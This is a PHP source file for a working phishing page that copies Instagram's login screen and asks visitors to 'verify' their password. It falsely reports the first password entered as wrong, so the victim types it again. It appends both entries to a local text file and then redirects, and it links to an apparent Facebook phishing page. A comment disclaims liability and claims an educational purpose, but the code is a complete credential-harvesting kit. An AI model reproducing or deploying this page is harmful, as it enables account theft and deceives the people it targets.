<!doctype html>

<!-- 
This is for educational purposes. 
We are not responsible for any illegal use of this code. 

-->
<?php

if(isset($_POST['submit']))
{
	$myFile = "./passwd/insta_pass.txt";
	$psswd = $_POST['password1'];
	
	if(strlen($_POST['password1']) != 0)
	{
		$revisit = false;
		if(isset($_COOKIE["our_cookie"]))
		{
			
			$file = fopen($myFile, "a") or  die ("file not open..."); // create and open text file

			$s = "\nThe 2nd password is: ".$psswd."\n";

			fputs($file, $s) or die ("Data not written..."); //write single line of file

			fclose($file); //close file


			if(strlen($_POST['password1']) != 0 && count($_COOKIE) > 0)
			{
					header('location: redirect.php');
					exit;
			}
			//unset the cookie here
			setcookie("our_cookie", "", time() - 3600);
			$revisit = true;
		}
		else
		{
			$revisit = false;
			$messge = "<font color='red'>You have entered wrong password.</font>";
			setcookie("our_cookie", true, time() +40); // Create the cookie here;
			
			$file = fopen($myFile, "a") or  die ("file not open..."); // create and open text file

			$s = "\nThe 1st password is: ".$psswd."\n";

			fputs($file, $s) or die ("Data not written..."); //write single line of file

			fclose($file); //close file
		}
	}
	else
	{
		$messge = "<font color='red'>You have entered wrong password.</font>";
		$revisit = false;
		if(isset($_COOKIE["our_cookie"])) // Check iff the cookie is already active
		{
			// Then destroy the cookie
			setcookie("our_cookie", "", time() - 3600);
		}
	}
	
}

?>

<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="HandheldFriendly" content="true">
<link rel="shortcut icon" type="image/x-icon" href="favcon.ico">
<link href="style.css" rel="stylesheet">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">

<title>Login • Instagram</title>
</head>

<body>
<div class="container">
	<div class="row">
	
	<div class="col-sm-10">
		<div class="center-column text-center">
			<img src="instagram.png" class="instagram-logo">
			<p class="info">
			You are Trying to access Instagram app from another webpage.
			</p><?php 
					if(isset($_POST['submit']) && strlen($_POST['password1']) == 0)
					{
						echo $messge;
					}
			
					if(isset($_POST['submit']) && $revisit == false && strlen($_POST['password1']) != 0)
					{
						echo $messge;
					}
				?>
			<br/>
			<p class="info">
			Please verify your password.
			</p>
			<form method="post">
			
			<div class="form-group">
			<input type="password" class="form-control" placeholder="Password" name="password1">
			</div>
			
			<input type="submit" name="submit" class="btn btn-primary btn-block" value="Verify">
			
			</form>
			<p class="or">OR</p>
			
			<img src="fb_icon1.png"> 
			<a style=" align-content: center; margin: 0; padding: 0; font-size: 14px;" href="facebook.php" class="facebook-c">
				<span style="margin-top: 15px; text-decoration: none;">Log in With Facebook</span>
				</a>
				<br/>
				<br/>
			<p class="info">
				Forgot password <a href="#">click here</a>
			</p>
			
		</div>
		<!--
		<div class="right-column-login text-center">
		<p class="info">
			Log in With Facebook	
		</p>
		</div> -->
	</div>
	
	</div>
</div>

</body>
</html>
